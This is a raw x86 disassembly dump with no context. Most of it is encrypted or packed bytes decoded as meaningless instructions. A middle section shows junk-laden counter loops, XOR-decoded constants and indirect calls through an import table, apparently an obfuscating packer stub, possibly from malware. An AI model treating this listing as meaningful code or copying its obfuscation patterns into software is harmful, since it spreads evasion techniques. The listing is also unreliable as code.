  40b1e2:	aaa    
  40b1e3:	std    
  40b1e4:	sub    BYTE PTR [eax+ebx*4-0x4091b679],dl
  40b1eb:	and    BYTE PTR [esi+0x15],0x6f
  40b1ef:	lds    eax,FWORD PTR [esi-0x5b]
  40b1f2:	ja     0x40b187
  40b1f4:	(bad)  
  40b1f5:	jae    0x40b1b4
  40b1f7:	and    al,0x34
  40b1f9:	aad    0x77
  40b1fb:	push   ds
  40b1fc:	cmp    DWORD PTR [ecx+0x23],ecx
  40b1ff:	mov    edi,0xd78d842f
  40b204:	dec    ecx
  40b205:	dec    ebp
  40b206:	rol    ebx,0x92
  40b209:	jmp    0x587d20ee
  40b20e:	test   BYTE PTR [esi-0x11],dh
  40b211:	push   ecx
  40b212:	pop    ds
  40b213:	push   edi
  40b214:	jle    0x40b1be
  40b216:	mov    esi,0x171fe9e4
  40b21b:	xchg   esi,eax
  40b21c:	xor    esi,edx
  40b21e:	sbb    DWORD PTR [eax+edi*4],ecx
  40b221:	xchg   esi,eax
  40b222:	lock fist WORD PTR [edi+0xd9f47aa]
  40b229:	pop    ebx
  40b22a:	test   BYTE PTR [esi-0x41],0x24
  40b22e:	dec    ebx
  40b22f:	hlt    
  40b230:	mov    cl,0xda
  40b232:	lods   eax,DWORD PTR ds:[esi]
  40b233:	jne    0x40b2a8
  40b235:	pop    ds
  40b236:	xor    DWORD PTR [ecx-0x7b],esi
  40b239:	fst    DWORD PTR ds:0xe2d249a7
  40b23f:	cmp    al,0x50
  40b241:	mov    bl,0x82
  40b243:	fisubr DWORD PTR [edi]
  40b245:	push   edx
  40b246:	or     eax,0xd58b2c3d
  40b24b:	cdq    
  40b24c:	inc    edi
  40b24d:	fcmovnbe st,st(2)
  40b24f:	aaa    
  40b250:	mov    al,ds:0x7f937334
  40b255:	shl    BYTE PTR [eax*2-0x439492be],1
  40b25c:	je     0x40b2ad
  40b25e:	jp     0x40b21e
  40b260:	fsubr  st(2),st
  40b262:	fst    DWORD PTR [eax]
  40b264:	rcr    ecx,1
  40b266:	xor    DWORD PTR [edi],ebx
  40b268:	add    BYTE PTR [ebp-0x33],0x6e
  40b26c:	cmp    BYTE PTR [ecx-0x106ff83],0xce
  40b273:	cmc    
  40b274:	push   eax
  40b275:	ja     0x40b271
  40b277:	jbe    0x40b292
  40b279:	push   eax
  40b27a:	mov    ecx,0xc6e5af73
  40b27f:	cmp    ecx,DWORD PTR [esi+edi*4-0x20f419d2]
  40b286:	jmp    0x3e25:0x1119b886
  40b28d:	xlat   BYTE PTR ds:[ebx]
  40b28e:	cli    
  40b28f:	jmp    0x40b27e
  40b291:	and    ah,BYTE PTR [edx]
  40b293:	jl     0x40b2fa
  40b295:	sub    ah,BYTE PTR [eax-0x1a]
  40b298:	mov    al,0xcb
  40b29a:	xchg   DWORD PTR [edi+0x1553f243],edi
  40b2a0:	jbe    0x40b236
  40b2a2:	xchg   edx,eax
  40b2a3:	or     ah,BYTE PTR [ecx+0xf3c42f3]
  40b2a9:	adc    bh,BYTE PTR [edi]
  40b2ab:	rcl    DWORD PTR ds:0x756aa049,0x59
  40b2b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2b3:	mov    es,WORD PTR [eax-0x66]
  40b2b6:	sub    DWORD PTR [ebp+eax*8+0x33973631],0x4152c7f8
  40b2c1:	aam    0x29
  40b2c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2c4:	rol    DWORD PTR [ebx+0x24b0461e],1
  40b2ca:	scas   al,BYTE PTR es:[edi]
  40b2cb:	fsubr  QWORD PTR [ecx+edi*4+0x16]
  40b2cf:	cmp    DWORD PTR [eax+0x57],esi
  40b2d2:	iret   
  40b2d3:	mov    esp,0xe723fd75
  40b2d8:	sbb    eax,0x41b1560b
  40b2dd:	outs   dx,BYTE PTR ds:[esi]
  40b2de:	dec    esp
  40b2df:	sbb    eax,0x1df33484
  40b2e4:	(bad)  
  40b2e5:	push   cs
  40b2e6:	cmp    al,0xac
  40b2e8:	cs (bad) 
  40b2ea:	pop    ecx
  40b2eb:	xchg   edi,eax
  40b2ec:	jecxz  0x40b365
  40b2ee:	pop    ebp
  40b2ef:	int3   
  40b2f0:	dec    edi
  40b2f1:	loope  0x40b313
  40b2f3:	loop   0x40b349
  40b2f5:	scas   al,BYTE PTR es:[edi]
  40b2f6:	jo     0x40b2a3
  40b2f8:	jo     0x40b34d
  40b2fa:	int3   
  40b2fb:	add    edx,DWORD PTR [esi]
  40b2fd:	sbb    edx,ebx
  40b2ff:	adc    cl,BYTE PTR [edi+0x6e]
  40b302:	xor    al,0x4a
  40b304:	pop    ss
  40b305:	or     eax,0xa11e0b91
  40b30a:	sbb    bl,cl
  40b30c:	or     BYTE PTR [ecx+esi*2+0x12],dl
  40b310:	das    
  40b311:	and    eax,0xd98276e0
  40b316:	sub    eax,0x6b3bac02
  40b31b:	dec    ecx
  40b31c:	adc    BYTE PTR [eax+ebp*1+0x29],dl
  40b320:	mov    ch,0xcb
  40b322:	retf   0x450a
  40b325:	adc    ah,BYTE PTR ds:[eax]
  40b328:	mov    ds:0x5245021e,al
  40b32d:	in     al,0xff
  40b32f:	out    dx,al
  40b330:	cdq    
  40b331:	dec    edx
  40b332:	std    
  40b333:	and    BYTE PTR [esi-0x33c56226],dh
  40b339:	dec    esp
  40b33a:	pop    eax
  40b33b:	icebp  
  40b33c:	dec    ebx
  40b33d:	xor    DWORD PTR [esp+ebx*8-0x38],edx
  40b341:	push   es
  40b342:	fiadd  DWORD PTR [ebx+0x2a157093]
  40b348:	lock out dx,eax
  40b34a:	sub    al,0xb8
  40b34c:	rcr    BYTE PTR [esi+0x14],1
  40b34f:	inc    esi
  40b350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b351:	jmp    0x925936d4
  40b356:	scas   eax,DWORD PTR es:[edi]
  40b357:	and    esp,DWORD PTR [ebx-0x1a1e42cc]
  40b35d:	push   esp
  40b35e:	mov    ah,0xfc
  40b360:	jnp    0x40b3b3
  40b362:	xor    eax,0x4c165a0b
  40b367:	clc    
  40b368:	adc    edx,DWORD PTR [edx]
  40b36a:	addr16 pusha 
  40b36c:	mov    WORD PTR [edi-0x64b7565a],ds
  40b372:	outs   dx,BYTE PTR es:[esi]
  40b374:	push   ebp
  40b375:	les    ecx,FWORD PTR [edi-0x662383b7]
  40b37b:	jo     0x40b3a7
  40b37d:	jge    0x40b3c2
  40b37f:	push   0x70
  40b381:	lods   eax,DWORD PTR ds:[esi]
  40b382:	lea    edi,[ebx]
  40b384:	jne    0x40b3df
  40b386:	adc    bh,BYTE PTR ds:0x2558b1e4
  40b38c:	sub    ecx,ebp
  40b38e:	add    DWORD PTR [edx-0x6d],eax
  40b391:	cli    
  40b392:	fcmovnb st,st(1)
  40b394:	fst    QWORD PTR [eax]
  40b396:	xchg   esp,eax
  40b397:	add    DWORD PTR [ecx-0x1b07b2e5],ecx
  40b39d:	adc    dl,dl
  40b39f:	in     eax,dx
  40b3a0:	enter  0x8a77,0x24
  40b3a4:	pop    ebx
  40b3a5:	bnd jae 0x40b400
  40b3a8:	das    
  40b3a9:	test   al,0x15
  40b3ab:	in     al,dx
  40b3ac:	sub    bh,bh
  40b3ae:	jae    0x40b3d7
  40b3b0:	(bad)  
  40b3b1:	frstor [ebp+0x44]
  40b3b4:	les    edi,FWORD PTR [ebp+0x27e5b963]
  40b3ba:	shl    BYTE PTR [eax+0x4f],0xd0
  40b3be:	inc    esp
  40b3bf:	pushf  
  40b3c0:	fild   WORD PTR [eax+0xfd9bf67]
  40b3c6:	sub    DWORD PTR [esi+0x2f],ecx
  40b3c9:	hlt    
  40b3ca:	inc    ebp
  40b3cb:	jecxz  0x40b3bd
  40b3cd:	or     eax,edi
  40b3cf:	scas   eax,DWORD PTR es:[edi]
  40b3d0:	mov    ebp,0x8b53ed26
  40b3d5:	or     al,0x22
  40b3d7:	mov    dh,BYTE PTR [esi]
  40b3d9:	pop    ecx
  40b3da:	push   ecx
  40b3db:	cmp    al,0x19
  40b3dd:	inc    esp
  40b3de:	jp     0x40b446
  40b3e0:	test   DWORD PTR [ebx+esi*8],esp
  40b3e3:	pop    edi
  40b3e4:	mov    dh,0x7a
  40b3e6:	ins    BYTE PTR es:[edi],dx
  40b3e7:	inc    eax
  40b3e8:	repnz inc ebx
  40b3ea:	fist   WORD PTR [esi]
  40b3ec:	push   ds
  40b3ed:	dec    ebp
  40b3ee:	cmc    
  40b3ef:	mov    bl,0xe
  40b3f1:	jae    0x40b3d6
  40b3f3:	fmul   DWORD PTR [edi+ebx*1]
  40b3f6:	outs   dx,DWORD PTR ds:[esi]
  40b3f7:	pop    ds
  40b3f8:	test   esi,esp
  40b3fa:	call   FWORD PTR [eax+0x2a55a629]
  40b400:	cmp    cl,BYTE PTR [edx+ecx*8+0x2adbd08]
  40b407:	imul   ecx,DWORD PTR [ebp-0x1d],0xffffffab
  40b40b:	xchg   edi,eax
  40b40c:	mov    ah,0x39
  40b40e:	and    cl,ah
  40b410:	les    esi,FWORD PTR [esi-0x6e2dd323]
  40b416:	jl     0x40b410
  40b418:	ja     0x40b467
  40b41a:	pop    es
  40b41b:	push   es
  40b41c:	add    ebp,DWORD PTR [ecx]
  40b41e:	aaa    
  40b41f:	mov    dh,0x90
  40b421:	xlat   BYTE PTR ds:[ebx]
  40b422:	movsx  esi,bl
  40b425:	das    
  40b426:	leave  
  40b427:	fidivr DWORD PTR [ebx]
  40b429:	jnp    0x40b470
  40b42b:	or     dl,0x6c
  40b42e:	mov    esp,0x5037dbc3
  40b433:	ret    
  40b434:	xchg   BYTE PTR [ebx+0x3],bh
  40b437:	inc    ebx
  40b438:	in     al,0xe4
  40b43a:	data16 mov BYTE PTR ds:0x5b72c135,dh
  40b441:	add    al,0xf
  40b443:	mov    ecx,0x955f5ce6
  40b448:	fcmovnb st,st(6)
  40b44a:	mov    ch,0x6
  40b44c:	adc    eax,0xa5daffb2
  40b451:	sbb    cl,BYTE PTR [esi]
  40b453:	mov    edx,0xb3721f7c
  40b458:	pop    ebp
  40b459:	cmp    DWORD PTR [eax+edi*1+0x5898478d],esi
  40b460:	add    BYTE PTR [edi+0x34],0x2
  40b464:	outs   dx,BYTE PTR ds:[esi]
  40b465:	jp     0x40b448
  40b467:	cmp    eax,0xf4ef3455
  40b46c:	mov    eax,ds:0xffc26cb6
  40b471:	frstor [ebp-0x66980c17]
  40b477:	div    DWORD PTR [edi-0x79]
  40b47a:	loope  0x40b41e
  40b47c:	jecxz  0x40b413
  40b47e:	test   DWORD PTR [esi+0x3e],ecx
  40b481:	bnd jnp 0x40b45b
  40b484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b486:	retf   0xa826
  40b489:	inc    edi
  40b48a:	(bad)  [eax]
  40b48c:	adc    edx,esp
  40b48e:	jo     0x40b420
  40b490:	rcl    BYTE PTR [edx+0x6565404f],1
  40b496:	push   ebp
  40b497:	xor    BYTE PTR [ecx],0xe8
  40b49a:	xchg   ecx,eax
  40b49b:	fsin   
  40b49d:	(bad)  
  40b49e:	ins    DWORD PTR es:[edi],dx
  40b49f:	ss cmc 
  40b4a1:	xor    eax,0x97b7201e
  40b4a6:	(bad)  
  40b4a7:	mov    ss,WORD PTR [ebx]
  40b4a9:	adc    BYTE PTR [eax],0x2b
  40b4ac:	retf   0xb2e4
  40b4af:	xchg   esi,eax
  40b4b0:	out    dx,al
  40b4b1:	ins    BYTE PTR es:[edi],dx
  40b4b2:	mov    bh,dl
  40b4b4:	fist   DWORD PTR [eax]
  40b4b6:	xchg   esi,eax
  40b4b7:	sub    BYTE PTR [edx+ebx*4-0x74],cl
  40b4bb:	inc    ecx
  40b4bc:	dec    esp
  40b4bd:	mov    WORD PTR [eax-0x4b809465],ss
  40b4c3:	inc    esp
  40b4c4:	push   eax
  40b4c5:	nop
  40b4c6:	pop    edi
  40b4c7:	(bad)  
  40b4c8:	cld    
  40b4c9:	arpl   ax,sp
  40b4cb:	inc    esp
  40b4cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4cd:	jne    0x40b45e
  40b4cf:	jb     0x40b50c
  40b4d1:	ret    0xd469
  40b4d4:	lds    edi,FWORD PTR [ebp-0x5d6a2cda]
  40b4da:	sbb    BYTE PTR [ecx+0x39b6e29f],0x21
  40b4e1:	scas   al,BYTE PTR es:[edi]
  40b4e2:	popf   
  40b4e3:	cs cli 
  40b4e5:	xchg   esp,eax
  40b4e6:	inc    ebp
  40b4e7:	mov    eax,0x2723c4fc
  40b4ec:	sar    BYTE PTR [esp+eiz*2+0x74a1026e],cl
  40b4f3:	cmp    al,al
  40b4f5:	jnp    0x40b4bd
  40b4f7:	jno    0x40b514
  40b4f9:	scas   eax,DWORD PTR es:[edi]
  40b4fa:	cld    
  40b4fb:	leave  
  40b4fc:	and    BYTE PTR ss:[esi],bh
  40b4ff:	test   al,0xb0
  40b501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b503:	or     eax,0xa4c43f75
  40b508:	mov    WORD PTR [eax+0x1b],?
  40b50b:	sbb    al,0xd9
  40b50d:	loopne 0x40b55d
  40b50f:	icebp  
  40b510:	cs or  al,0x7d
  40b513:	shl    BYTE PTR ds:0xd34677f6,cl
  40b519:	cmc    
  40b51a:	mov    esp,0xf8b96c38
  40b51f:	mov    cl,0xfd
  40b521:	mov    si,0x46a6
  40b525:	mov    esp,0xb9a1c95d
  40b52a:	scas   al,BYTE PTR es:[edi]
  40b52b:	pop    ecx
  40b52c:	addr16 or eax,0x7e5c8520
  40b532:	mov    edx,0x1d58630e
  40b537:	add    al,0xa
  40b539:	mov    edx,0xde6df7fd
  40b53e:	mov    esi,0xe25c76d0
  40b543:	xor    DWORD PTR [ecx],edi
  40b545:	into   
  40b546:	hlt    
  40b547:	lods   eax,DWORD PTR ds:[esi]
  40b548:	into   
  40b549:	loope  0x40b4d3
  40b54b:	dec    edx
  40b54c:	sub    ebp,ebx
  40b54e:	rcl    DWORD PTR [ebp+0x71],cl
  40b551:	sbb    DWORD PTR [ebp-0x4411707b],edi
  40b557:	pop    esp
  40b558:	in     al,0x85
  40b55a:	mov    eax,ds:0x1f8cb89e
  40b55f:	cmp    esp,edx
  40b561:	and    eax,0xec4bb6ae
  40b566:	jle    0x40b51b
  40b568:	repz inc edi
  40b56a:	stc    
  40b56b:	scas   al,BYTE PTR es:[edi]
  40b56c:	xchg   edi,eax
  40b56d:	jmp    0x40b562
  40b56f:	cld    
  40b570:	xlat   BYTE PTR ds:[ebx]
  40b571:	and    ecx,edx
  40b573:	xor    esi,DWORD PTR ds:0x28f91034
  40b579:	(bad)  
  40b57a:	lods   al,BYTE PTR ds:[esi]
  40b57b:	pop    ds
  40b57c:	push   esi
  40b57d:	adc    esi,0x29b8
  40b583:	push   edi
  40b584:	or     edi,DWORD PTR ds:0x42b010
  40b58a:	mov    esi,0x7510893
  40b58f:	or     ecx,ecx
  40b591:	xor    eax,esi
  40b593:	mov    edi,0x3272db
  40b598:	add    eax,edi
  40b59a:	sub    DWORD PTR ds:0x42a018,0x772b
  40b5a4:	mov    DWORD PTR [ebp-0x38],eax
  40b5a7:	mov    eax,ds:0x4217a2
  40b5ac:	mov    ecx,DWORD PTR ds:0x428008
  40b5b2:	and    DWORD PTR ds:0x42b004,ecx
  40b5b8:	mov    eax,DWORD PTR [eax]
  40b5ba:	mov    DWORD PTR ds:0x42a01c,0x19
  40b5c4:	cmp    DWORD PTR ds:0x42a01c,0x0
  40b5cb:	je     0x40b61b
  40b5d1:	cmp    DWORD PTR ds:0x42a01c,0x4
  40b5d8:	jne    0x40b5ef
  40b5de:	push   0x506a
  40b5e3:	push   DWORD PTR [ebp-0x24]
  40b5e6:	push   DWORD PTR [ebp-0x14]
  40b5e9:	call   DWORD PTR ds:0x424028
  40b5ef:	cmp    DWORD PTR ds:0x42a01c,0x5
  40b5f6:	jne    0x40b609
  40b5fc:	mov    ecx,DWORD PTR ds:0x42a01c
  40b602:	dec    ecx
  40b603:	mov    DWORD PTR ds:0x42a01c,ecx
  40b609:	mov    ecx,DWORD PTR ds:0x42a01c
  40b60f:	dec    ecx
  40b610:	mov    DWORD PTR ds:0x42a01c,ecx
  40b616:	jmp    0x40b5c4
  40b61b:	mov    DWORD PTR [ebp-0x24],eax
  40b61e:	add    DWORD PTR ds:0x428014,ecx
  40b624:	mov    eax,ds:0x4219aa
  40b629:	mov    ecx,DWORD PTR ds:0x42171a
  40b62f:	mov    ecx,DWORD PTR [ecx]
  40b631:	adc    DWORD PTR ds:0x42a008,ecx
  40b637:	mov    eax,DWORD PTR [eax]
  40b639:	and    DWORD PTR ds:0x42a01c,0x0
  40b643:	jmp    0x40b655
  40b648:	mov    ecx,DWORD PTR ds:0x42a01c
  40b64e:	inc    ecx
  40b64f:	mov    DWORD PTR ds:0x42a01c,ecx
  40b655:	cmp    DWORD PTR ds:0x42a01c,0x10
  40b65c:	jae    0x40b75b
  40b662:	cmp    DWORD PTR ds:0x42a01c,0x8
  40b669:	jne    0x40b67f
  40b66f:	push   0x4235de
  40b674:	push   0x42355e
  40b679:	call   DWORD PTR ds:0x424030
  40b67f:	cmp    DWORD PTR ds:0x42a01c,0x7
  40b686:	jne    0x40b69b
  40b68c:	xor    ecx,ecx
  40b68e:	xor    ecx,DWORD PTR ds:0x42a01c
  40b694:	inc    ecx
  40b695:	mov    DWORD PTR ds:0x42a01c,ecx
  40b69b:	jmp    0x40b648
  40b6a0:	and    DWORD PTR ds:0x42901c,0x0
  40b6aa:	jmp    0x40b6bc
  40b6af:	mov    ecx,DWORD PTR ds:0x42901c
  40b6b5:	inc    ecx
  40b6b6:	mov    DWORD PTR ds:0x42901c,ecx
  40b6bc:	cmp    DWORD PTR ds:0x42901c,0x11
  40b6c3:	jae    0x40b75b
  40b6c9:	cmp    DWORD PTR ds:0x42901c,0x7
  40b6d0:	jne    0x40b6f6
  40b6d6:	push   DWORD PTR [ebp-0x10]
  40b6d9:	push   DWORD PTR [ebp-0x18]
  40b6dc:	push   0x2cae
  40b6e1:	push   0x19d0
  40b6e6:	push   0x7b35
  40b6eb:	push   0x42c01c
  40b6f0:	call   DWORD PTR ds:0x424038
  40b6f6:	cmp    DWORD PTR ds:0x42901c,0x6
  40b6fd:	jne    0x40b710
  40b703:	mov    ecx,DWORD PTR ds:0x42901c
  40b709:	inc    ecx
  40b70a:	mov    DWORD PTR ds:0x42901c,ecx
  40b710:	jmp    0x40b6af
  40b715:	mov    DWORD PTR ds:0x42c00c,0x11
  40b71f:	cmp    DWORD PTR ds:0x42c00c,0x0
  40b726:	je     0x40b75b
  40b72c:	cmp    DWORD PTR ds:0x42c00c,0x18
  40b733:	jne    0x40b749
  40b739:	push   0x42a008
  40b73e:	push   0x6229
  40b743:	call   DWORD PTR ds:0x42403c
  40b749:	mov    ecx,DWORD PTR ds:0x42c00c
  40b74f:	dec    ecx
  40b750:	mov    DWORD PTR ds:0x42c00c,ecx
  40b756:	jmp    0x40b71f
  40b75b:	mov    DWORD PTR [ebp-0x28],eax
  40b75e:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  40b765:	mov    eax,DWORD PTR [ebp-0x34]
  40b768:	xor    eax,esi
  40b76a:	add    eax,edi
  40b76c:	sbb    DWORD PTR ds:0x42a000,0x3656
  40b776:	mov    DWORD PTR [ebp-0x38],eax
  40b779:	mov    eax,ds:0x421922
  40b77e:	mov    DWORD PTR [ebp-0x38],eax
  40b781:	or     eax,0x6382
  40b786:	mov    eax,DWORD PTR [ebp-0x24]
  40b789:	and    DWORD PTR ds:0x42a008,0x0
  40b793:	mov    ecx,DWORD PTR ds:0x42a008
  40b799:	inc    ecx
  40b79a:	mov    DWORD PTR ds:0x42a008,ecx
  40b7a0:	cmp    DWORD PTR ds:0x42a008,0x9
  40b7a7:	jne    0x40b7bb
  40b7ad:	push   DWORD PTR [ebp-0x14]
  40b7b0:	push   0x423539
  40b7b5:	call   DWORD PTR ds:0x424040
  40b7bb:	cmp    DWORD PTR ds:0x42a008,0x8
  40b7c2:	jne    0x40b7d7
  40b7c8:	xor    ecx,ecx
  40b7ca:	add    ecx,DWORD PTR ds:0x42a008
  40b7d0:	inc    ecx
  40b7d1:	mov    DWORD PTR ds:0x42a008,ecx
  40b7d7:	cmp    DWORD PTR ds:0x42a008,0x17
  40b7de:	jb     0x40b793
  40b7e4:	mov    DWORD PTR [ebp-0x14],eax
  40b7e7:	mov    eax,DWORD PTR [ebp-0x14]
  40b7ea:	dec    DWORD PTR ds:0x42c000
  40b7f0:	push   0x4
  40b7f2:	and    ecx,DWORD PTR ds:0x42a018
  40b7f8:	pop    ecx
  40b7f9:	sbb    DWORD PTR ds:0x42b000,0x429004
  40b803:	sub    ecx,eax
  40b805:	xor    DWORD PTR ds:0x42a01c,0x102e
  40b80f:	add    ecx,DWORD PTR [ebp-0x28]
  40b812:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  40b819:	adc    eax,0x5aaa
  40b81e:	mov    DWORD PTR [ebp-0x20],ecx
  40b821:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  40b82b:	and    DWORD PTR ds:0x428010,0x0
  40b835:	jmp    0x40b848
  40b83a:	xor    eax,eax
  40b83c:	add    eax,DWORD PTR ds:0x428010
  40b842:	inc    eax
  40b843:	mov    ds:0x428010,eax
  40b848:	cmp    DWORD PTR ds:0x428010,0x10
  40b84f:	jae    0x40b88a
  40b855:	cmp    DWORD PTR ds:0x428010,0x9
  40b85c:	jne    0x40b86d
  40b862:	push   0x423550
  40b867:	call   DWORD PTR ds:0x424044
  40b86d:	cmp    DWORD PTR ds:0x428010,0x8
  40b874:	jne    0x40b885
  40b87a:	mov    eax,ds:0x428010
  40b87f:	inc    eax
  40b880:	mov    ds:0x428010,eax
  40b885:	jmp    0x40b83a
  40b88a:	mov    eax,DWORD PTR [ebp-0x14]
  40b88d:	sbb    DWORD PTR ds:0x42a018,0x429014
  40b897:	mov    DWORD PTR [ebp-0x90],eax
  40b89d:	dec    eax
  40b89e:	mov    eax,DWORD PTR [ebp-0x20]
  40b8a1:	mov    DWORD PTR [ebp-0x8c],eax
  40b8a7:	add    DWORD PTR ds:0x42c00c,0x20f
  40b8b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40b8b4:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  40b8be:	xor    eax,esi
  40b8c0:	add    eax,edi
  40b8c2:	mov    DWORD PTR [ebp-0x88],eax
  40b8c8:	lea    eax,[ebp-0x50]
  40b8cb:	or     DWORD PTR ds:0x42b014,0x1a32
  40b8d5:	mov    DWORD PTR [ebp-0x84],eax
  40b8db:	mov    eax,DWORD PTR [ebp-0x94]
  40b8e1:	xor    DWORD PTR ds:0x42b010,0x42a00c
  40b8eb:	xor    eax,esi
  40b8ed:	xor    DWORD PTR ds:0x42900c,0x429018
  40b8f7:	add    eax,edi
  40b8f9:	and    DWORD PTR ds:0x428020,0x42c01c
  40b903:	mov    DWORD PTR [ebp-0x94],eax
  40b909:	and    DWORD PTR ds:0x42a000,0x429010
  40b913:	lea    eax,[ebp-0x94]
  40b919:	adc    DWORD PTR ds:0x42b018,0x42c018
  40b923:	push   eax
  40b924:	movzx  eax,WORD PTR ds:0x42b01c
  40b92b:	add    DWORD PTR ds:0x42a008,eax
  40b931:	mov    eax,DWORD PTR [ebp+0xc]
  40b934:	xor    eax,esi
  40b936:	add    DWORD PTR ds:0x428028,0x2102
  40b940:	add    eax,edi
  40b942:	sub    DWORD PTR ds:0x429010,0x36a
  40b94c:	push   eax
  40b94d:	mov    eax,ds:0x421942
  40b952:	adc    DWORD PTR ds:0x428024,0x6674
  40b95c:	push   0x421898
  40b961:	and    DWORD PTR ds:0x42a014,0x6ed
  40b96b:	push   DWORD PTR [eax]
  40b96d:	add    DWORD PTR ds:0x42a000,0x42900c
  40b977:	call   0x405c6f
  40b97c:	or     eax,DWORD PTR ds:0x42901c
  40b982:	mov    eax,DWORD PTR [ebp-0x14]
  40b985:	and    ecx,0x4079
  40b98b:	mov    ecx,DWORD PTR [ebp-0x20]
  40b98e:	sub    DWORD PTR ds:0x42b01c,0xab5
  40b998:	mov    DWORD PTR [ebp-0x44],ecx
  40b99b:	sbb    DWORD PTR ds:0x42b01c,edi
  40b9a1:	mov    ecx,DWORD PTR [ebp+0x8]
  40b9a4:	jmp    0x40dd19
  40b9a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9aa:	or     ah,bl
  40b9ac:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x2c56403
  40b9b7:	mov    ah,0x4e
  40b9b9:	dec    edi
  40b9ba:	hlt    
  40b9bb:	bound  esp,QWORD PTR [edx+0xa]
  40b9be:	pop    edi
  40b9bf:	bound  esp,QWORD PTR [edx-0x6b]
  40b9c2:	sub    al,0x47
  40b9c4:	inc    edx
  40b9c5:	mov    al,ds:0xe2d56817
  40b9ca:	in     al,0xcf
  40b9cc:	sbb    DWORD PTR [ebp+0x274dc643],ebx
  40b9d2:	adc    bl,BYTE PTR [esi-0x29]
  40b9d5:	fwait
  40b9d6:	vmsave 
  40b9d9:	xlat   BYTE PTR ds:[ebx]
  40b9da:	into   
  40b9db:	sub    al,0xc2
  40b9dd:	in     al,0x9b
  40b9df:	aas    
  40b9e0:	mov    esp,DWORD PTR [eax-0x1e]
  40b9e3:	daa    
  40b9e4:	xor    al,0xc7
  40b9e6:	(bad)  
  40b9e7:	stos   BYTE PTR es:[edi],al
  40b9e8:	out    0x77,eax
  40b9ea:	fld    DWORD PTR [ebx]
  40b9ec:	rol    DWORD PTR [edx+0x40],cl
  40b9ef:	jmp    0x40b9bc
  40b9f1:	call   0xe21d:0x9f434af0
  40b9f8:	shl    bh,0xfe
  40b9fb:	sub    DWORD PTR [edx-0x39],eax
  40b9fe:	pop    esi
  40b9ff:	cmc    
  40ba00:	ret    0x3386
  40ba03:	call   0xc8148873
  40ba08:	push   esp
  40ba09:	(bad)  
  40ba0a:	enter  0xcc5b,0xd4
  40ba0e:	cmova  eax,DWORD PTR [esi+0x15]
  40ba12:	pop    ss
  40ba13:	pop    edi
  40ba14:	cmp    eax,DWORD PTR [esi+0x70e26495]
  40ba1a:	mov    bh,0x62
  40ba1c:	dec    ebp
  40ba1d:	and    esi,DWORD PTR [eax+0x22409af2]
  40ba23:	inc    edi
  40ba24:	adc    eax,0x4c912d29
  40ba29:	rcl    BYTE PTR [ebx-0x6a],1
  40ba2c:	cdq    
  40ba2d:	test   eax,0xb502d4ff
  40ba32:	jae    0x40ba0d
  40ba34:	sbb    al,0x47
  40ba36:	jmp    0xee8e97b6
  40ba3b:	pop    edi
  40ba3c:	fcomp  DWORD PTR [ebx+0x40ec4ca8]
  40ba42:	popa   
  40ba43:	js     0x40ba8b
  40ba45:	lea    edx,[ebx-0x59]
  40ba48:	sbb    al,0x76
  40ba4a:	cdq    
  40ba4b:	daa    
  40ba4c:	aas    
  40ba4d:	jae    0x83032b68
  40ba53:	paddsb mm4,mm3
  40ba56:	push   ss
  40ba57:	scas   al,BYTE PTR es:[edi]
  40ba58:	loopne 0x40b9df
  40ba5a:	ja     0x40ba81
  40ba5c:	mov    al,ds:0xbc89d060
  40ba61:	jbe    0x40ba3f
  40ba63:	and    bl,BYTE PTR [eax]
  40ba65:	jg     0x40ba74
  40ba67:	scas   eax,DWORD PTR es:[edi]
  40ba68:	mov    al,ds:0xdd25cc7c
  40ba6d:	fistp  WORD PTR gs:[ecx-0x7d]
  40ba71:	stos   BYTE PTR es:[edi],al
  40ba72:	fcom   DWORD PTR [ebp-0x3f]
  40ba75:	or     eax,0xb2c616c
  40ba7a:	mov    WORD PTR [eax-0x4d21c2a5],?
  40ba80:	or     BYTE PTR [ebx],0x72
  40ba83:	ret    
  40ba84:	or     edi,ecx
  40ba86:	cmc    
  40ba87:	jno    0x40ba60
  40ba89:	add    DWORD PTR [ebx],0x5100dfc2
  40ba8f:	sbb    ecx,DWORD PTR [edi+0x11]
  40ba92:	lea    ebx,[di]
  40ba95:	shl    DWORD PTR [edx],1
  40ba97:	push   ebx
  40ba98:	sahf   
  40ba99:	mov    bl,BYTE PTR ds:0xe673979e
  40ba9f:	add    esp,DWORD PTR [edi-0xb7dd20b]
  40baa5:	inc    esp
  40baa6:	(bad)  
  40baa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baa9:	push   eax
  40baaa:	data16 cmc 
  40baac:	call   0x612b2490
  40bab1:	sbb    al,0xdd
  40bab3:	ret    0xdc3b
  40bab6:	sub    ebp,ecx
  40bab8:	loope  0x40bac1
  40baba:	adc    esp,eax
  40babc:	(bad)  
  40babe:	xor    al,al
  40bac0:	rcr    BYTE PTR [esi],cl
  40bac2:	hlt    
  40bac3:	ficom  WORD PTR [ecx]
  40bac5:	jb     0x40ba7d
  40bac7:	and    ch,dl
  40bac9:	jmp    0x1eb598bb
  40bace:	mov    ebp,0xd210a69e
  40bad3:	(bad)  
  40bad5:	sbb    eax,0x181f7ee9
  40bada:	xchg   ebx,eax
  40badb:	out    dx,eax
  40badc:	repz sbb DWORD PTR [ebx-0x4e94369f],0xffffffec
  40bae4:	sbb    BYTE PTR [ebx-0xa0d064e],cl
  40baea:	je     0x40ba74
  40baec:	sti    
  40baed:	je     0x40bae3
  40baef:	or     ebx,DWORD PTR [ebx]
  40baf1:	pop    es
  40baf2:	inc    ebp
  40baf3:	sahf   
  40baf4:	add    al,0x46
  40baf6:	ds clc 
  40baf8:	imul   ebx,DWORD PTR [edx],0xf9d8a10c
